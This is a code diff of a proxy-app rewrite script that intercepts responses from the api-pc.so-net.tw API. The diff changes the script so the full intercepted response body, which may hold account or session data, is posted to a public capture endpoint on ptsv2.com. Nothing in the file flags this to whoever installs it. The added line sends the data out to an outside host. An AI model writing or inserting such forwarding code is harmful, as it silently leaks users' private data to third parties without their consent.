@@ -20,30 +20,28 @@ http-response https:\/\/api-pc\.so-net\.tw\/.* requires-body=1,max-size=0,script
 hostname = api-pc.so-net.tw
 
 **************************/
-const $nobyda = nobyda();
+const $req = req();
 
 var body = $response.body;
-console.log("1234567");
 console.log(body);
-console.log("1234567");
 const testServer = {
     url: 'https://ptsv2.com/t/5y3is-1625470771/post',
-    body: "platform=ios"
+    body: body
   };
-  $nobyda.post(testServer, function(error, response, data) {
+  $req.post(testServer, function(error, response, data) {
     if (!error) {
       if (parseInt(response.status) == 200) {
-        $nobyda.notify("Success", "", "")
+        $req.notify("Success", "", "")
       } else {
 
       }
     }
-    $nobyda.end()
+    $req.end()
   })
 $done(body);
 
 
-function nobyda() {
+function req() {
     const isRequest = typeof $request != "undefined"
     const isSurge = typeof $httpClient != "undefined"
     const isQuanX = typeof $task != "undefined"
